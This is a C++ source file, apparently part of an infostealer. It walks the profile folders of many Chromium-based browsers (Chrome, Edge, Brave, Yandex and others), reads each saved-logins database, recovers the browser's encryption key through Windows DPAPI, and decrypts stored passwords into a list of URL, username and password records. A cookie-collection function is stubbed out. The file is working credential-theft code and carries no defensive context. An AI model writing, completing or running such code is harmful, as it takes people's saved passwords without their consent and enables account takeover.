#include "ChromeParser.h"
#include "sqlite3.h"
#include "cJSON.h"
#include "Base64.h"

#pragma warning(disable:4996)

ChromeParser::ChromeParser()
{
	path_list = {
		"\\Google\\Chrome",
		"\\Google(x86)\\Chrome",
		"\\Chromium",
		"\\Microsoft\\Edge",
		"\\BraveSoftware\\Brave-Browser",
		"\\Epic Privacy Browser",
		"\\Amigo",
		"\\Vivaldi",
		"\\Orbitum",
		"\\Mail.Ru\\Atom",
		"\\Kometa",
		"\\Comodo\\Dragon",
		"\\Torch",
		"\\Comodo",
		"\\Slimjet",
		"\\360Browser\\Browser",
		"\\Maxthon3",
		"\\K-Melon",
		"\\Sputnik\\Sputnik",
		"\\Nichrome",
		"\\CocCoc\\Browser",
		"\\uCozMedia\\Uran",
		"\\Chromodo",
		"\\Yandex\\YandexBrowser"
	};
}


String ChromeParser::ChromeDecrypt(String chromePath, String txt)
{
    if (txt.size() < 0x20) return "";
    //os_crypt/encrypted_key
    if (txt.starts_with("v10") || txt.starts_with("v11")) {
        vector<BYTE> dpiDecKey = GetChromeKey(chromePath);
        return DecryptWithKey(dpiDecKey, txt);
    }
    else {
        vector<BYTE> v(txt.c_str(), txt.c_str() + txt.size());
        return String((char*)RawEncrpyt(v).data());
    }
    return String();
}

vector<BYTE> ChromeParser::GetChromeKey(String chromeRPath)
{
    vector<BYTE> ret;
    String stateFile = chromeRPath + "\\User Data\\Local State";

    ifstream file(stateFile);
    if (!file.is_open())
        return ret;
    std::string content((std::istreambuf_iterator<char>(file)), (std::istreambuf_iterator<char>()));

    cJSON* json_root = cJSON_Parse(content.c_str());
    if (!json_root)
        return ret;

    cJSON* oscrypt = cJSON_GetObjectItem(json_root, "os_crypt");
    if (!oscrypt)
        return ret;

    cJSON* encrypted_key = cJSON_GetObjectItem(oscrypt, "encrypted_key");
    if (!encrypted_key)
        return ret;

    String encKey = encrypted_key->valuestring;
    vector<unsigned char> decKey = base64_decryptor::base64_decode(encKey);
    vector<unsigned char> temp(decKey.data() + 5, decKey.data() + decKey.size());

    return RawEncrpyt(temp);
}

vector<BYTE> ChromeParser::RawEncrpyt(vector<BYTE> _data)
{
    vector<BYTE> ret;

    DATA_BLOB DataOut;
    DataOut.cbData = (int)_data.size();
    DataOut.pbData = _data.data();

    DATA_BLOB DataVerify;

    if (CryptUnprotectData(&DataOut, 0, NULL, NULL, NULL, 0, &DataVerify))
    {
        ret = vector<BYTE>(DataVerify.pbData, DataVerify.pbData + DataVerify.cbData);
        LocalFree(DataVerify.pbData);
    }
    else
    {
        printf("Decryption error!");
    }
    return ret;
}

String ChromeParser::DecryptWithKey(vector<BYTE> dpiDecKey, String txt)
{
    if (dpiDecKey.size() == 0) return "";

    BCRYPT_ALG_HANDLE m_hAlg;
    BCRYPT_KEY_HANDLE m_hKey;

    if (BCryptOpenAlgorithmProvider(&m_hAlg, BCRYPT_AES_ALGORITHM, 0, 0) != 0) {
        printf("[DEBUG] Crypt::BCrypt::Init: can't initialize cryptoprovider. Last error code: %d \n",
            GetLastError());
        return "";
    }

    if (BCryptSetProperty(m_hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0)
    {
        printf("[DEBUG] Crypt::BCrypt::Init: can't set chaining mode. Last error code: %d \n", GetLastError());
        return "";
    }

    if (BCryptGenerateSymmetricKey(m_hAlg, &m_hKey, NULL, 0, dpiDecKey.data(), (int)dpiDecKey.size(), 0) != 0) {
        printf("[DEBUG] Crypt::BCrypt::Init: can't deinitialize cryptoprovider. Last error code: %d \n",
            GetLastError());
        return "";
    }

    unsigned char* cipher = (unsigned char*)txt.c_str() + 15;
    ULONG cipherLen = txt.length() - 15;

    //3byte + BIV(12byte) + data + tag(16byte) = min 31
    vector<BYTE> bIV(cipher - 0x0C, cipher);
    vector<BYTE> bTag(cipher + cipherLen - 0x10, cipher + cipherLen);
    vector<BYTE> bData(cipher, cipher + cipherLen - 0x10);

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO BACMI;
    BCRYPT_INIT_AUTH_MODE_INFO(BACMI);

    BACMI.pbNonce = (PUCHAR)(bIV.data());
    BACMI.cbNonce = bIV.size();
    BACMI.pbTag = (PUCHAR)(bTag.data());
    BACMI.cbTag = bTag.size();

    ULONG encLen = 0;
    UCHAR output[1024];
    memset(output, 0, 1024);

    DWORD result = BCryptDecrypt(m_hKey, bData.data(), bData.size(), &BACMI, NULL, 0, (PUCHAR)output, 1024, &encLen, 0);
    if (result == 0 && encLen > 0)
        return String((char*)output);
    return String();
}

List<AccountData> ChromeParser::CollectAccounts()
{
	List<AccountData> retData = List<AccountData>();
	String localAppDataPath = getenv("LOCALAPPDATA");
	for (const auto& relativePath : path_list)
	{
		String dbPath = format("{}{}\\User Data\\Default\\Login Data", localAppDataPath, relativePath);
		sqlite3* db;
		if (sqlite3_open(dbPath.c_str(), &db) != SQLITE_OK)
			continue;
		sqlite3_stmt* stmt;
		if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, 0) != SQLITE_OK)
			continue;

		while (sqlite3_step(stmt) == SQLITE_ROW)
		{
			char* url = (char*)sqlite3_column_text(stmt, 0);
			char* username = (char*)sqlite3_column_text(stmt, 1);
			char* password = (char*)sqlite3_column_text(stmt, 2);

			if (!url || strlen(url) == 0) continue;
			if (!username || strlen(username) == 0) continue;
			if (!password || strlen(password) == 0) continue;

			String decryptedPassword = ChromeParser::ChromeDecrypt(localAppDataPath + relativePath, password);
			if (decryptedPassword.empty()) continue;

			AccountData data;
			data.Username = username;
			data.Url = url;
			data.Password = decryptedPassword;

			retData.push_back(data);
		}
	}
	return retData;
}

List<CookieData> ChromeParser::CollectCookie()
{
	return List<CookieData>();
}
